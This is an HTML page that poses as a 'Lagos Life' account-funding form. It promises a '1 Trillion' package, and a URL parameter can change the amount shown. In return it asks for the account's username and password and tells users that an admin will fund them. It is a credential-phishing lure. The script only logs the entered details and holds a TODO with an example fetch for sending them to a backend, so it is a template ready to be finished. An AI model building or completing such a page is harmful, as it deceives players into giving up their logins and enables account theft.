<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lagos Life - Fund Account</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
    body { background: #0f172a; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
    .card { background: #1e293b; padding: 28px; border-radius: 16px; width: 100%; max-width: 420px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
    h2 { text-align: center; margin-bottom: 8px; font-size: 22px; }
    .package { text-align: center; background: #334155; padding: 12px; border-radius: 10px; margin: 16px 0 24px; font-weight: 600; color: #38bdf8; }
    label { display: block; margin: 12px 0 6px; font-size: 14px; color: #cbd5e1; }
    input { width: 100%; padding: 14px; border: none; border-radius: 10px; background: #334155; color: #fff; font-size: 16px; }
    input:focus { outline: 2px solid #38bdf8; }
    button { width: 100%; margin-top: 20px; padding: 14px; background: #38bdf8; color: #0f172a; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; }
    button:hover { background: #0ea5e9; }
    .success { display: none; text-align: center; background: #166534; padding: 16px; border-radius: 10px; margin-top: 16px; }
  </style>
</head>
<body>
  <div class="card">
    <h2>Fund Your Lagos Life</h2>
    <div class="package">Package: <span id="package">1 Trillion</span></div>

    <form id="loginForm">
      <label>Lagos Life Username</label>
      <input type="text" id="username" placeholder="Enter username" required>

      <label>Password</label>
      <input type="password" id="password" placeholder="Enter password" required>

      <button type="submit">Submit Details</button>
    </form>

    <div class="success" id="success">
      Details received! Admin will fund your account shortly.
    </div>
  </div>

  <script>
    // Optional: get package from URL ?package=1Trillion
    const params = new URLSearchParams(window.location.search);
    if (params.get('package')) {
      document.getElementById('package').textContent = params.get('package');
    }

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const packageAmount = document.getElementById('package').textContent;

      // TODO: Send to your backend / Firebase here
      // Example: fetch('/api/submit', { method: 'POST', body: JSON.stringify({ username, password, packageAmount }) })

      console.log({ username, password, packageAmount }); // Remove in production

      document.getElementById('loginForm').style.display = 'none';
      document.getElementById('success').style.display = 'block';
    });
  </script>
</body>
        </html>
